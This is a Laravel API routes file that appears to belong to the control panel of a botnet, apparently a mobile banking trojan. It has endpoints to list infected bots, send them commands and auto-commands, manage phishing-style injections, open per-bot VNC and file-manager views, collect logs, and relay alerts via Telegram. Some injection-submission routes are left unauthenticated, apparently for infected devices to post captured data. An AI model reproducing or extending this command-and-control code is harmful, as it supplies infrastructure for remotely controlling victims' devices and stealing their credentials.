<?php

use App\Http\Controllers\Api\v1\AuthController;
use App\Http\Controllers\Api\v1\AutoCommandsController;
use App\Http\Controllers\Api\v1\Bot\BotCommandController;
use App\Http\Controllers\Api\v1\Bot\BotController;
use App\Http\Controllers\Api\v1\Bot\BotFileManagerController;
use App\Http\Controllers\Api\v1\Bot\BotInjectionController;
use App\Http\Controllers\Api\v1\Bot\BotSettingsController;
use App\Http\Controllers\Api\v1\Bot\BotVNCController;
use App\Http\Controllers\Api\v1\CountController;
use App\Http\Controllers\Api\v1\FilterController;
use App\Http\Controllers\Api\v1\InjectionController;
use App\Http\Controllers\Api\v1\LogController;
use App\Http\Controllers\Api\v1\PermissionController;
use App\Http\Controllers\Api\v1\SearchController;
use App\Http\Controllers\Api\v1\SmartInjectionController;
use App\Http\Controllers\Api\v1\StatsController;
use App\Http\Controllers\Api\v1\UserController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "api" middleware group. Make something great!
|
*/

Route::group(["prefix" => "v1"], function (): void {
    Route::post("sign-in", [AuthController::class, "login"]);

    Route::group(["prefix" => "smartInjections"], function (): void {
        Route::post("{sessionId}", [SmartInjectionController::class, "store"]);

        Route::group(["prefix" => "session"], function (): void {
            Route::post("list", [SmartInjectionController::class, "index"]);

            Route::put("{session}", [SmartInjectionController::class, "update"]);
        });
    });

    Route::group(["middleware" => "auth:sanctum"], function (): void {
        Route::get("getUserInfo", [AuthController::class, "me"]);

        Route::group(["prefix" => "injects"], function (): void {
            Route::post("getInjectionsList", [InjectionController::class, "index"])
                ->middleware("can:injections.list");

            Route::post("createInjection", [InjectionController::class, "create"])
                ->middleware("can:injections.create");

            Route::delete("deleteInjection", [InjectionController::class, "delete"])
                ->middleware("can:injections.delete");

            Route::group(["prefix" => "{injection}"], function (): void {
                // TODO PUT on front
                Route::post("editInjection", [InjectionController::class, "update"])
                    ->middleware("can:injections.edit");

                // TODO merge with update action
                Route::put("changeAutoInject", [InjectionController::class, "changeAutoInject"])
                    ->middleware("can:injections.edit");
            });
        });

        Route::group(["prefix" => "bots"], function (): void {
            Route::post("getBotsList", [BotController::class, "index"])
                ->can("bots.list");

            Route::get("getBotsFilter", [FilterController::class, "show"]);

            Route::post("sendBotsCommand", [BotCommandController::class, "store"]);

            Route::delete("deleteBot", [BotController::class, "delete"])
                ->middleware("can:bots.delete");

            Route::delete("deleteAllRemovedApp", [BotController::class, "deleteAllRemovedApp"])
                ->middleware("can:bots.delete");

            Route::group(["prefix" => "{bot}"], function (): void {
                Route::put("setBotType", [BotController::class, "setType"]);

                Route::group(["prefix" => "commands"], function (): void {
                    Route::get("getCommandsList", [BotCommandController::class, "index"]);
                });

                Route::group(["prefix" => "settings"], function (): void {
                    Route::put("updateBotSettings", [BotSettingsController::class, "update"]);
                });

                Route::group(["prefix" => "injects"], function (): void {
                    Route::put("updateBotInjections", [BotInjectionController::class, "update"]);
                });

                Route::group(["prefix" => "vnc"], function (): void {
                    Route::get("list", [BotVNCController::class, "show"]);
                });

                Route::group(["prefix" => "fileManager"], function (): void {
                    Route::get("list", [BotFileManagerController::class, "show"]);
                });
            });

            Route::put("editBotComment", [BotController::class, "editComment"]);
        });

        Route::group(["prefix" => "logs"], function (): void {
            Route::post("getLogsList", [LogController::class, "index"]);

            Route::delete("deleteLog", [LogController::class, "delete"]);

            Route::put("editLogComment", [LogController::class, "editComment"]);
        });

        Route::group(["prefix" => "accounts"], function (): void {
            Route::post("getAccountsList", [UserController::class, "index"])
                ->middleware("can:users.list");

            Route::post("createAccount", [UserController::class, "create"])
                ->middleware("can:users.create");

            Route::put("updateTelegramInjection", [UserController::class, "updateTelegramInjection"])
                ->middleware("can:bots.list");

            Route::put("updateTelegramBot", [UserController::class, "updateTelegramBot"])
                ->middleware("can:bots.list");

            Route::post("sendTelegramMessage", [UserController::class, "sendTelegramMessage"])
                ->middleware("can:users.list");

            Route::put("unbindTelegram", [UserController::class, "unbindTelegram"])
                ->middleware("can:users.list");

            Route::group(["prefix" => "{user}"], function (): void {
                Route::put("editAccount", [UserController::class, "edit"])
                    ->middleware("can:users.edit");

                Route::delete("deleteAccount", [UserController::class, "delete"])
                    ->middleware("can:users.delete");

                Route::put("generateTelegramSecretWord", [UserController::class, "generateTelegramSecretWord"])
                    ->middleware("can:users.generateTelegramSecretWord");
            });
        });

        Route::group(["prefix" => "permissions"], function (): void {
            Route::post("getPermissionsList", [PermissionController::class, "index"])
                ->middleware("can:permissions.list");

            Route::put("updatePermission", [PermissionController::class, "update"])
                ->middleware("can:permissions.change");
        });

        Route::group(["prefix" => "counts"], function (): void {
            Route::post("getCounts", [CountController::class, "index"]);
        });

        Route::group(["prefix" => "statistics"], function (): void {
            Route::post("getStats", [StatsController::class, "index"]);
        });

        Route::group(["prefix" => "autoCommands"], function (): void {
            Route::post("getAutoCommandsList", [AutoCommandsController::class, "index"]);
            Route::put("updateAutoCommand", [AutoCommandsController::class, "update"]);
        });

        Route::group(["prefix" => "search"], function (): void {
            Route::post("", [SearchController::class, "index"]);
        });
    });
});

